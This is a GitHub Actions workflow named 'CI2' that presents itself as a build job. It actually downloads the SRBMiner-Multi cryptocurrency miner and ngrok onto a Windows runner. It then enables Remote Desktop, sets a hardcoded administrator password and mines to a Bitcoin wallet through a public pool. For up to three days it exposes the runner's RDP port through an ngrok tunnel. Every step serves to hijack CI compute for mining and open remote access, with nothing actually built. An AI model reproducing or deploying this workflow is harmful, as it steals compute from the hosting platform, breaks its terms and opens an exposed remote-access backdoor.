name: CI2

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 4320 # 3 days timeout, adjust as needed

    steps:
      - name: Print Current Directory
        run: |
          echo "Current Directory: $PWD"
      - name: Download ngrok
        run: |
          Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
      - name: Extract ngrok
        run: |
          Expand-Archive ngrok.zip
          echo "After Extraction - Current Directory: $PWD"
      - name: Download SRBMiner-Multi
        run: |
          Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip -OutFile SRBMiner.zip
          Expand-Archive SRBMiner.zip -DestinationPath $env:USERPROFILE\Desktop\SRBMiner-Multi-2-4-7-win64\
      - name: List Contents of SRBMiner Directory
        run: Get-ChildItem -Path $env:USERPROFILE\Desktop\SRBMiner-Multi-2-4-7-win64\
      - name: Auth
        run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
        env:
          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
      - name: Enable TS
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
      - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
      - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
      - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
      - name: Run SRBMiner-Multi
        run: |
          cd $env:USERPROFILE\Desktop\SRBMiner-Multi-2-4-7-win64\SRBMiner-Multi-2-4-7\
          .\SRBMiner-MULTI.exe --Algorithm randomx --Pool stratum+ssl://rx.unmineable.com:4444 --Wallet BTC:bc1q5pp474lrjgeufplp7nyke3cfgxc49qn99ll688.btcminer180
      - name: Create Tunnel
        timeout-minutes: 4320 # 3 days timeout
        run: .\ngrok\ngrok.exe tcp 3389
